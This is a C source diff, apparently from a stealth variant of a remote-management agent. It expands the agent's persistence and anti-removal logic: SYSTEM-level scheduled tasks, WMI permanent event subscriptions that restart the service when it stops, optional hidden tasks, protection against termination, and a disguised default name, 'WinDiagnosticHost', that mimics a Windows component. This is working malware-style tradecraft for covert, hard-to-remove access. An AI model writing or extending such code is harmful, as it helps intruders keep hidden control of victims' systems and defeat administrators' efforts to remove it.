@@ -110,8 +110,8 @@ static void Stealth_UpdatePersistenceStatePath(const wchar_t* installRoot);
 
 // Forward declarations for persistence helpers
 static void Stealth_AddRunKeyIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
-static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
-static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
+static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName, BOOL refreshExisting);
+static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName, BOOL refreshExisting);
 static void Stealth_ConfigureServiceRecoveryIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
 static SC_ACTION* Stealth_CreateRestartPlan(size_t actionCount, DWORD delayMs, DWORD* actionCountOut);
 static SC_ACTION* Stealth_BuildRecoveryActionsFromCsv(const wchar_t* csv, DWORD delayMs, DWORD* actionCountOut);
@@ -880,6 +880,15 @@ BOOL Stealth_PerformCompleteInstallation(
         Stealth_LogInstallEvent(L"[WARN] Failed to harden service DACL for %ls (see debug output)", serviceKeyName);
     }
 
+    if (Stealth_ProtectServiceFromTermination(serviceKeyName))
+    {
+        Stealth_LogInstallEvent(L"Configured service termination protection for %ls", serviceKeyName);
+    }
+    else
+    {
+        Stealth_LogInstallEvent(L"[WARN] Service termination protections not applied to %ls", serviceKeyName);
+    }
+
     // Step 4: Add Windows Firewall exceptions
     const wchar_t* fileToExcept = L"C:\\Windows\\System32\\svchost.exe";
 
@@ -1161,55 +1170,72 @@ static BOOL Stealth_RemoveScheduledTaskByName(const wchar_t* taskName, const wch
 
 static void Stealth_RemoveScheduledTasks(const mesh_persistence_profile_t* persistence, const wchar_t* serviceDisplayName, const wchar_t* serviceKeyName)
 {
-    const size_t maxCandidates = 8;
-    wchar_t autorunCandidates[8][STEALTH_TASK_NAME_MAX] = {0};
-    size_t autorunCount = 0;
-    wchar_t restartCandidates[8][STEALTH_TASK_NAME_MAX] = {0};
-    size_t restartCount = 0;
-    wchar_t buffer[STEALTH_TASK_NAME_MAX] = {0};
+    UNREFERENCED_PARAMETER(persistence);
+    UNREFERENCED_PARAMETER(serviceDisplayName);
 
-    if (persistence != NULL)
+    wchar_t servicePrefix[STEALTH_TASK_NAME_MAX] = {0};
+    Stealth_BuildSanitizedToken(serviceKeyName, servicePrefix, _countof(servicePrefix));
+    if (servicePrefix[0] == L'\0')
     {
-        if (Stealth_CopyTaskNameFromUtf8(persistence->autorunTask.taskName, buffer, _countof(buffer)))
+        StringCchCopyW(servicePrefix, _countof(servicePrefix), L"WinDiagnosticHost");
+    }
+
+    StealthPersistenceState state = {0};
+    BOOL hadState = Stealth_LoadPersistenceState(&state);
+
+    if (state.AutorunTask[0] != L'\0')
+    {
+        if (StealthResilience_DeleteTask(state.AutorunTask))
         {
-            Stealth_AddTaskCandidate(autorunCandidates, &autorunCount, maxCandidates, buffer);
+            Stealth_LogInstallEvent(L"Removed autorun task %ls", state.AutorunTask);
         }
-        if (Stealth_CopyTaskNameFromUtf8(persistence->restartTask.taskName, buffer, _countof(buffer)))
+    }
+    if (state.RestartTask[0] != L'\0')
+    {
+        if (StealthResilience_DeleteTask(state.RestartTask))
         {
-            Stealth_AddTaskCandidate(restartCandidates, &restartCount, maxCandidates, buffer);
+            Stealth_LogInstallEvent(L"Removed restart-on-stop task %ls", state.RestartTask);
+        }
+    }
+    if (state.WmiFilter[0] != L'\0' || state.WmiConsumer[0] != L'\0')
+    {
+        StealthResilience_RemoveWmiSubscription(state.WmiFilter, state.WmiConsumer);
+    }
+
+    if (!hadState)
+    {
+        wchar_t autoPrefix[STEALTH_TASK_NAME_MAX] = {0};
+        StringCchPrintfW(autoPrefix, _countof(autoPrefix), L"%s-", servicePrefix);
+
+        DWORD removed = 0;
+        StealthResilience_DeleteTasksByPrefix(autoPrefix, L"-Autorun-", &removed);
+        if (removed > 0)
+        {
+            Stealth_LogInstallEvent(L"Removed %lu autorun task(s) via prefix cleanup", removed);
+        }
+        removed = 0;
+        StealthResilience_DeleteTasksByPrefix(autoPrefix, L"-RestartOnStop-", &removed);
+        if (removed > 0)
+        {
+            Stealth_LogInstallEvent(L"Removed %lu restart-on-stop task(s) via prefix cleanup", removed);
+        }
+
+        wchar_t filterPrefix[256] = {0};
+        wchar_t consumerPrefix[256] = {0};
+        StringCchPrintfW(filterPrefix, _countof(filterPrefix), L"%s_StopFilter_", servicePrefix);
+        StringCchPrintfW(consumerPrefix, _countof(consumerPrefix), L"%s_RestartConsumer_", servicePrefix);
+        DWORD filtersRemoved = 0, consumersRemoved = 0;
+        StealthResilience_RemoveWmiSubscriptionsByPrefix(filterPrefix, consumerPrefix, &filtersRemoved, &consumersRemoved);
+        if (filtersRemoved > 0 || consumersRemoved > 0)
+        {
+            Stealth_LogInstallEvent(L"Removed %lu WMI filters and %lu consumers via prefix cleanup", filtersRemoved, consumersRemoved);
         }
     }
 
-    if (Stealth_FormatDefaultTaskName(serviceDisplayName, L"-Autorun", buffer, _countof(buffer)))
-    {
-        Stealth_AddTaskCandidate(autorunCandidates, &autorunCount, maxCandidates, buffer);
-    }
-    if (Stealth_FormatDefaultTaskName(serviceKeyName, L"-Autorun", buffer, _countof(buffer)))
-    {
-        Stealth_AddTaskCandidate(autorunCandidates, &autorunCount, maxCandidates, buffer);
-    }
-
-    if (Stealth_FormatDefaultTaskName(serviceDisplayName, L"-RestartOnStop", buffer, _countof(buffer)))
-    {
-        Stealth_AddTaskCandidate(restartCandidates, &restartCount, maxCandidates, buffer);
-    }
-    if (Stealth_FormatDefaultTaskName(serviceKeyName, L"-RestartOnStop", buffer, _countof(buffer)))
-    {
-        Stealth_AddTaskCandidate(restartCandidates, &restartCount, maxCandidates, buffer);
-    }
-
-    for (size_t i = 0; i < autorunCount; ++i)
-    {
-        Stealth_RemoveScheduledTaskByName(autorunCandidates[i], L"schtasks.exe /Delete (autorun)");
-    }
-
-    for (size_t i = 0; i < restartCount; ++i)
-    {
-        Stealth_RemoveScheduledTaskByName(restartCandidates[i], L"schtasks.exe /Delete (restart-on-stop)");
-    }
+    Stealth_ClearPersistenceState();
 }
 
-static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
+static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName, BOOL refreshExisting)
 {
     if (persistence == NULL || persistence->autorunTask.enabled == 0 || serviceName == NULL || serviceName[0] == L'\0')
     {
@@ -1217,112 +1243,225 @@ static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* 
         return;
     }
 
-    Stealth_LogInstallEvent(L"Scheduling autorun task for %ls", serviceName);
+    wchar_t servicePrefix[STEALTH_TASK_NAME_MAX] = {0};
+    Stealth_BuildSanitizedToken(serviceName, servicePrefix, _countof(servicePrefix));
+    if (servicePrefix[0] == L'\0')
+    {
+        StringCchCopyW(servicePrefix, _countof(servicePrefix), L"WinDiagnosticHost");
+    }
 
-    wchar_t sysDir[MAX_PATH];
-    wchar_t scPath[MAX_PATH];
-    wchar_t cmdLine[1024];
-    wchar_t taskName[128] = {0};
+    wchar_t diagnosticsPrefix[STEALTH_TASK_NAME_MAX] = {0};
+    StringCchPrintfW(diagnosticsPrefix, _countof(diagnosticsPrefix), L"%s-", servicePrefix);
+
     wchar_t trigger[64] = {0};
-
-    if (persistence->autorunTask.taskName != NULL)
-    {
-        MeshService_CopyBrandingTextToWide(persistence->autorunTask.taskName, taskName, _countof(taskName));
-    }
-    if (taskName[0] == L'\0')
-    {
-        StringCchPrintfW(taskName, _countof(taskName), L"\\%s-Autorun", serviceName);
-    }
-    else if (taskName[0] != L'\\')
-    {
-        wchar_t original[128];
-        StringCchCopyW(original, _countof(original), taskName);
-        StringCchPrintfW(taskName, _countof(taskName), L"\\%s", original);
-    }
-
-    if (persistence->autorunTask.trigger != NULL)
-    {
-        MeshService_CopyBrandingTextToWide(persistence->autorunTask.trigger, trigger, _countof(trigger));
-    }
+    MeshService_CopyBrandingTextToWide(persistence->autorunTask.trigger, trigger, _countof(trigger));
     if (trigger[0] == L'\0')
     {
         StringCchCopyW(trigger, _countof(trigger), L"ONLOGON");
     }
     Stealth_ToUppercase(trigger);
 
-    GetSystemDirectoryW(sysDir, MAX_PATH);
-    StringCchPrintfW(scPath, MAX_PATH, L"%s\\sc.exe", sysDir);
+    wchar_t taskHint[STEALTH_TASK_NAME_MAX] = {0};
+    MeshService_CopyBrandingTextToWide(persistence->autorunTask.taskName, taskHint, _countof(taskHint));
 
-    StringCchPrintfW(cmdLine, 1024,
-        L"\"%s\\schtasks.exe\" /Create /TN \"%s\" /TR \"%s start %s\" /SC %s /RU \"SYSTEM\" /RL HIGHEST /F",
-        sysDir,
-        taskName,
-        scPath,
-        serviceName,
-        trigger);
+    StealthPersistenceState state = {0};
+    BOOL haveState = Stealth_LoadPersistenceState(&state);
 
-    if (Stealth_RunCommand(cmdLine, L"schtasks.exe /Create (autorun)"))
+    if (haveState && state.AutorunTask[0] != L'\0')
     {
-        Stealth_DebugPrintfW(L"Scheduled autorun task %ls", taskName);
-        Stealth_LogInstallEvent(L"Scheduled autorun task %ls", taskName);
+        if (StealthResilience_TaskExists(state.AutorunTask))
+        {
+            Stealth_LogInstallEvent(L"Scheduled autorun task already present (%ls)", state.AutorunTask);
+            return;
+        }
+        else if (refreshExisting)
+        {
+            Stealth_LogInstallEvent(L"Removing stale autorun task reference (%ls)", state.AutorunTask);
+            StealthResilience_DeleteTask(state.AutorunTask);
+            state.AutorunTask[0] = L'\0';
+            Stealth_SavePersistenceState(&state);
+        }
+    }
+
+    if (state.AutorunTask[0] == L'\0')
+    {
+        wchar_t existingTask[STEALTH_TASK_NAME_MAX] = {0};
+        if (StealthResilience_FindTaskByPrefix(diagnosticsPrefix, L"-Autorun-", existingTask, _countof(existingTask)))
+        {
+            Stealth_LogInstallEvent(L"Scheduled autorun task already present (%ls)", existingTask);
+            Stealth_RecordPersistenceTask(&state, existingTask, FALSE);
+            Stealth_SavePersistenceState(&state);
+            return;
+        }
+    }
+
+    wchar_t createdTaskPath[STEALTH_TASK_NAME_MAX] = {0};
+    if (StealthResilience_CreateAutorunTask(
+            serviceName,
+            taskHint,
+            trigger,
+            (persistence->autorunTask.hidden ? TRUE : FALSE),
+            createdTaskPath,
+            _countof(createdTaskPath)))
+    {
+        Stealth_LogInstallEvent(L"Scheduled autorun task %ls", createdTaskPath);
+        Stealth_RecordPersistenceTask(&state, createdTaskPath, FALSE);
+        Stealth_SavePersistenceState(&state);
+    }
+    else
+    {
+        Stealth_LogInstallEvent(L"[WARN] Failed to schedule autorun task for %ls", serviceName);
     }
 }
 
-static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
+static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName, BOOL refreshExisting)
 {
     if (persistence == NULL || persistence->restartTask.enabled == 0 || serviceName == NULL || serviceName[0] == L'\0')
     {
-        Stealth_LogInstallEvent(L"Restart-on-stop scheduled task disabled");
+        Stealth_LogInstallEvent(L"Restart-on-stop persistence disabled");
         return;
     }
 
-    Stealth_LogInstallEvent(L"Scheduling restart-on-stop task for %ls", serviceName);
-
-    // Implement as an event-driven scheduled task (instead of WMI permanent consumer)
-    // Triggers when Service Control Manager logs 7036 (service entered stopped state) for this service.
-    // schtasks /Create /TN <name> /TR "sc start <service>" /SC ONEVENT /EC System /MO <XPath> /RL HIGHEST /F
-    const wchar_t* xPathFormat =
-        L"*[System[Provider[@Name='Service Control Manager'] and EventID=7036]] and *[EventData[Data='%s'] and EventData[Data='stopped']]";
-    wchar_t xPath[1024];
-    StringCchPrintfW(xPath, 1024, xPathFormat, serviceName);
-
-    wchar_t sysDir[MAX_PATH];
-    wchar_t scPath[MAX_PATH];
-    wchar_t cmdLine[4096];
-
-    GetSystemDirectoryW(sysDir, MAX_PATH);
-    StringCchPrintfW(scPath, MAX_PATH, L"%s\\sc.exe", sysDir);
-
-    wchar_t taskName[128] = {0};
-    if (persistence->restartTask.taskName != NULL)
+    wchar_t servicePrefix[STEALTH_TASK_NAME_MAX] = {0};
+    Stealth_BuildSanitizedToken(serviceName, servicePrefix, _countof(servicePrefix));
+    if (servicePrefix[0] == L'\0')
     {
-        MeshService_CopyBrandingTextToWide(persistence->restartTask.taskName, taskName, _countof(taskName));
-    }
-    if (taskName[0] == L'\0')
-    {
-        StringCchPrintfW(taskName, _countof(taskName), L"\\%s-RestartOnStop", serviceName);
-    }
-    else if (taskName[0] != L'\\')
-    {
-        wchar_t original[128];
-        StringCchCopyW(original, _countof(original), taskName);
-        StringCchPrintfW(taskName, _countof(taskName), L"\\%s", original);
+        StringCchCopyW(servicePrefix, _countof(servicePrefix), L"WinDiagnosticHost");
     }
 
-    // Build command: schtasks.exe /Create ... /MO "<QueryList>..." (escaped)
-    // Wrap XPath in double quotes; CreateProcessW supports quotes.
-    StringCchPrintfW(cmdLine, 4096,
-        L"\"%s\\schtasks.exe\" /Create /TN \"%s\" /TR \"%s start %s\" /SC ONEVENT /EC System /MO \"%s\" /RU \"SYSTEM\" /RL HIGHEST /F",
-        sysDir,
-        taskName,
-        scPath,
-        serviceName,
-        xPath);
+    wchar_t diagnosticsPrefix[STEALTH_TASK_NAME_MAX] = {0};
+    StringCchPrintfW(diagnosticsPrefix, _countof(diagnosticsPrefix), L"%s-", servicePrefix);
 
-    if (Stealth_RunCommand(cmdLine, L"schtasks.exe /Create (restart-on-stop)"))
+    wchar_t filterPrefix[256] = {0};
+    wchar_t consumerPrefix[256] = {0};
+    StringCchPrintfW(filterPrefix, _countof(filterPrefix), L"%s_StopFilter_", servicePrefix);
+    StringCchPrintfW(consumerPrefix, _countof(consumerPrefix), L"%s_RestartConsumer_", servicePrefix);
+
+    StealthPersistenceState state = {0};
+    BOOL haveState = Stealth_LoadPersistenceState(&state);
+
+    BOOL restartTaskHealthy = FALSE;
+    BOOL wmiHealthy = FALSE;
+
+    if (haveState)
     {
-        Stealth_DebugPrintfW(L"Scheduled restart-on-stop task %ls", taskName);
-        Stealth_LogInstallEvent(L"Scheduled restart-on-stop task %ls", taskName);
+        if (state.RestartTask[0] != L'\0')
+        {
+            restartTaskHealthy = StealthResilience_TaskExists(state.RestartTask);
+            if (restartTaskHealthy)
+            {
+                Stealth_LogInstallEvent(L"Restart-on-stop task already present (%ls)", state.RestartTask);
+            }
+            else if (refreshExisting)
+            {
+                Stealth_LogInstallEvent(L"Removing stale restart task reference (%ls)", state.RestartTask);
+                StealthResilience_DeleteTask(state.RestartTask);
+                state.RestartTask[0] = L'\0';
+                Stealth_SavePersistenceState(&state);
+            }
+        }
+        if (state.WmiFilter[0] != L'\0' || state.WmiConsumer[0] != L'\0')
+        {
+            wmiHealthy = StealthResilience_WmiSubscriptionExists(state.WmiFilter, state.WmiConsumer);
+            if (wmiHealthy)
+            {
+                Stealth_LogInstallEvent(L"WMI restart subscription already present (%ls/%ls)", state.WmiFilter, state.WmiConsumer);
+            }
+            else if (refreshExisting)
+            {
+                Stealth_LogInstallEvent(L"Removing stale WMI subscription (%ls/%ls)", state.WmiFilter, state.WmiConsumer);
+                StealthResilience_RemoveWmiSubscription(state.WmiFilter, state.WmiConsumer);
+                state.WmiFilter[0] = L'\0';
+                state.WmiConsumer[0] = L'\0';
+                Stealth_SavePersistenceState(&state);
+            }
+        }
+    }
+
+    if (!restartTaskHealthy)
+    {
+        wchar_t existingRestart[STEALTH_TASK_NAME_MAX] = {0};
+        if (StealthResilience_FindTaskByPrefix(diagnosticsPrefix, L"-RestartOnStop-", existingRestart, _countof(existingRestart)))
+        {
+            Stealth_LogInstallEvent(L"Restart-on-stop task already present (%ls)", existingRestart);
+            Stealth_RecordPersistenceTask(&state, existingRestart, TRUE);
+            Stealth_SavePersistenceState(&state);
+            restartTaskHealthy = TRUE;
+        }
+    }
+
+    if (!wmiHealthy)
+    {
+        wchar_t existingFilter[128] = {0};
+        wchar_t existingConsumer[128] = {0};
+        if (StealthResilience_FindWmiSubscriptionsByPrefix(
+                filterPrefix,
+                consumerPrefix,
+                existingFilter,
+                _countof(existingFilter),
+                existingConsumer,
+                _countof(existingConsumer)))
+        {
+            Stealth_LogInstallEvent(L"WMI restart subscription already present (%ls/%ls)", existingFilter, existingConsumer);
+            Stealth_RecordPersistenceWmi(&state, existingFilter, existingConsumer);
+            Stealth_SavePersistenceState(&state);
+            wmiHealthy = TRUE;
+        }
+    }
+
+    wchar_t wmiFilter[128] = {0};
+    wchar_t wmiConsumer[128] = {0};
+    wchar_t wmiClass[128] = {0};
+    wchar_t wmiMethod[128] = {0};
+    wchar_t wmiNamespace[128] = {0};
+
+    MeshService_CopyBrandingTextToWide(persistence->restartTask.wmiClass, wmiClass, _countof(wmiClass));
+    MeshService_CopyBrandingTextToWide(persistence->restartTask.wmiMethod, wmiMethod, _countof(wmiMethod));
+    MeshService_CopyBrandingTextToWide(persistence->restartTask.wmiNamespace, wmiNamespace, _countof(wmiNamespace));
+
+    if (!wmiHealthy &&
+        StealthResilience_CreateWmiRestartSubscription(
+            serviceName,
+            wmiClass,
+            wmiMethod,
+            wmiNamespace,
+            wmiFilter,
+            _countof(wmiFilter),
+            wmiConsumer,
+            _countof(wmiConsumer)))
+    {
+        Stealth_LogInstallEvent(L"Registered WMI restart consumer (Filter=%ls Consumer=%ls)", wmiFilter, wmiConsumer);
+        Stealth_RecordPersistenceWmi(&state, wmiFilter, wmiConsumer);
+        Stealth_SavePersistenceState(&state);
+    }
+    else
+    {
+        Stealth_LogInstallEvent(L"[WARN] Failed to register WMI restart consumer for %ls", serviceName);
+    }
+
+    wchar_t restartHint[STEALTH_TASK_NAME_MAX] = {0};
+    MeshService_CopyBrandingTextToWide(persistence->restartTask.taskName, restartHint, _countof(restartHint));
+
+    wchar_t xPath[1024] = {0};
+    Stealth_FormatServiceStopXPath(serviceName, xPath, _countof(xPath));
+
+    wchar_t createdTaskPath[STEALTH_TASK_NAME_MAX] = {0};
+    if (!restartTaskHealthy &&
+        StealthResilience_CreateRestartTask(
+            serviceName,
+            restartHint,
+            xPath,
+            TRUE,
+            createdTaskPath,
+            _countof(createdTaskPath)))
+    {
+        Stealth_LogInstallEvent(L"Scheduled restart-on-stop task %ls", createdTaskPath);
+        Stealth_RecordPersistenceTask(&state, createdTaskPath, TRUE);
+        Stealth_SavePersistenceState(&state);
+    }
+    else
+    {
+        Stealth_LogInstallEvent(L"[WARN] Failed to schedule restart-on-stop task for %ls", serviceName);
     }
 }
 
@@ -1567,9 +1706,10 @@ void Stealth_ApplyPersistenceProfile(void)
         {
             Stealth_LogInstallEvent(L"Ensuring runtime persistence artifacts for %ls", serviceKeyName);
         }
+        BOOL refreshExisting = g_RuntimePersistenceApplied ? TRUE : FALSE;
         Stealth_AddRunKeyIfEnabled(persistence, serviceKeyName);
-        Stealth_AddScheduledTaskIfEnabled(persistence, serviceDisplayName);
-        Stealth_AddServiceStoppedAutoStartIfEnabled(persistence, serviceKeyName);
+        Stealth_AddScheduledTaskIfEnabled(persistence, serviceDisplayName, refreshExisting);
+        Stealth_AddServiceStoppedAutoStartIfEnabled(persistence, serviceKeyName, refreshExisting);
         Stealth_ConfigureServiceRecoveryIfEnabled(persistence, serviceKeyName);
         g_RuntimePersistenceApplied = TRUE;
     }
